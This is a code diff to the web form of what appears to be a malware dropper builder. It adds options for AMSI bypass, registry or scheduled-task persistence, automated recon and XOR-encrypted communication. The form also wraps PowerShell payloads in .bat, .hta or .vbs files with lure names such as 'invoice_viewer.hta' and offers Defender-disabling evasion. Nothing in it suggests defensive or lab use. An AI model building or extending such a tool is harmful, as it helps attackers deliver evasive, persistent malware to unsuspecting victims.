@@ -67,30 +67,66 @@
                     <input type="text" id="host" name="host" value="localhost" placeholder="e.g. 192.168.1.100">
                     <label for="port">Port:</label>
                     <input type="number" id="port" name="port" value="1443" min="1" max="65535">
+
+                    <!-- NEW: AMSI Bypass Method -->
+                    <label for="amsi_bypass">AMSI Bypass Method:</label>
+                    <select name="amsi_bypass" id="amsi_bypass">
+                        <option value="basic">Basic</option>
+                        <option value="redundant" selected>Redundant</option>
+                        <option value="advanced">Advanced Obfuscation</option>
+                    </select>
+
+                    <!-- NEW: Persistence Method -->
+                    <label for="persistence_method">Persistence Method:</label>
+                    <select name="persistence_method" id="persistence_method">
+                        <option value="none" selected>None</option>
+                        <option value="registry">Registry Run Key</option>
+                        <option value="schtasks">Scheduled Task</option>
+                    </select>
+
+                    <!-- NEW: Recon Automation -->
+                    <label>
+                        <input type="checkbox" id="auto_recon" name="auto_recon">
+                        Include automated initial recon commands
+                    </label>
+
+                    <!-- NEW: XOR Encryption -->
+                    <label>
+                        <input type="checkbox" id="xor_encrypt" name="xor_encrypt">
+                        Enable XOR-encrypted communication
+                    </label>
+
                 </div>
+
                 <div id="manual_fields">
                     <label for="ps1">PowerShell Payload (.ps1 content):</label>
                     <textarea name="ps1" id="ps1" rows="8" required placeholder="Paste your generated .ps1 payload here..."></textarea>
+
                     <label for="format">Wrapper Format:</label>
                     <select name="format" id="format" required>
                         <option value="bat">.bat (Batch File)</option>
                         <option value="hta">.hta (HTML Application)</option>
                         <option value="vbs">.vbs (VBScript)</option>
                     </select>
+
                     <label for="filename">Output Filename (optional):</label>
                     <input type="text" name="filename" id="filename" placeholder="e.g. invoice_viewer.hta">
+
                     <label>
                         <input type="checkbox" name="b64encode" id="b64encode" checked>
                         Base64-encode PowerShell payload (recommended for all wrapper types)
                     </label>
+
                     <label>
                         <input type="checkbox" id="evasion_enabled" name="evasion_enabled">
                         <span>Enable AV/Defender Evasion</span>
                     </label>
                     <small style="color: #888; margin-left: 34px;">(Injects AMSI/ETW bypass, disables Defender, obfuscates vars, etc.)</small>
                 </div>
+
                 <button type="submit">Generate Dropper</button>
             </form>
+
             {% if output_path %}
                 <a class="download-link" href="{{ url_for('payloads_download', filename=output_path) }}" download>
                         ⬇ Download: {{ output_path }}
@@ -124,9 +160,14 @@
             var builder = document.getElementById("use_builder").checked;
             document.getElementById("builder_fields").style.display = builder ? "block" : "none";
             document.getElementById("manual_fields").style.display = builder ? "none" : "block";
-            // If using builder, make ps1 box not required, else required
             document.getElementById("ps1").required = !builder;
+
+            document.getElementById("amsi_bypass").required = builder;
+            document.getElementById("persistence_method").required = builder;
         }
+
+
+        
     </script>
 </body>
 </html>
